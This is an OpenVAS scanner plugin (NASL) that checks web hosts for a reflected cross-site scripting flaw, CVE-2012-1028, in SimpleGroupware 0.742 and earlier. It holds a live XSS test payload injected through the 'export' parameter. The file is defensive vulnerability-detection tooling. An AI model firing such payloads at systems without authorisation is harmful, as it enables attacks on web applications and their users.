###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_simple_groupware_export_xss_vuln.nasl 12 2013-10-27 11:15:33Z jan $
#
# SimpleGroupware 'export' Parameter Cross Site Scripting Vulnerability
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attacker to execute arbitrary HTML and
  script code in a user's browser session in context of an affected site.
  Impact Level: Application";
tag_affected = "SimpleGroupware 0.742 and prior.";
tag_insight = "The flaw is due to an input passed via 'export' parameter to 'bin/index.php'
  is not properly sanitised before being returned to the user.";
tag_solution = "Upgrade to SimpleGroupware version 0.743 or later
  For updates refer to http://www.simple-groupware.de/cms/";
tag_summary = "This host is running SimpleGroupware and is prone to cross site
  scripting vulnerability.";

if(description)
{
  script_id(802589);
  script_version("$Revision: 12 $");
  script_cve_id("CVE-2012-1028");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2012-02-09 17:20:45 +0530 (Thu, 09 Feb 2012)");
  script_name("SimpleGroupware 'export' Parameter Cross Site Scripting Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://archives.neohapsis.com/archives/bugtraq/2012-02/0028.html");

  script_description(desc);
  script_summary("Check if SimpleGroupware is prone to XSS");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Varible Initialisation
port = 0;
sndReq = "";
rcvRes = "";
url = "";

## Get HTTP Port
port = get_http_port(default:80);
if(!port){
 port = 80;
}

if(!get_port_state(port)) {
  exit(0);
}

## Check host supports PHP
if(!can_host_php(port:port)){
  exit(0);
}

## Iterate over possible dir
foreach dir (make_list("/sgs/sgs_installer.php", "/sgs", cgi_dirs()))
{
  sndReq = http_get(item:string(dir, "/bin/index.php"), port:port);
  rcvRes = http_keepalive_send_recv(port:port, data:sndReq);

  ## Confirm the application
  if(rcvRes && ">Powered by Simple Groupware" >< rcvRes)
  {
    ## Construct attack
    url = dir + '/bin/index.php?export=<script>alert(document.cookie)' +
                                                   '</script>';

    ## Confirm exploit worked properly or not
    if(http_vuln_check(port:port, url:url, pattern:"<script>alert\(" +
                                    "document.cookie\)</script>"))
    {
      security_warning(port:port);
      exit(0);
    }
  }
}
